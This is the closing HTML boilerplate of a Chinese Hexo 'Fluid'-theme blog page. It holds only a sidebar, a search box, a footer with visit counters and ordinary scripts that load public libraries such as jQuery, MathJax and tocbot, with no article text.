  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://equinox-shame.github.io" target="_blank" rel="nofollow noopener"><span>梓曰</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        总访问量 
        <span id="leancloud-site-pv"></span>
         次
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        总访客数 
        <span id="leancloud-site-uv"></span>
         人
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }

        Fluid.events.registerRefreshCallback(function() {
          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
            MathJax.startup.document.state(0);
            MathJax.texReset();
            MathJax.typeset();
            MathJax.typesetPromise();
          }
        });
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
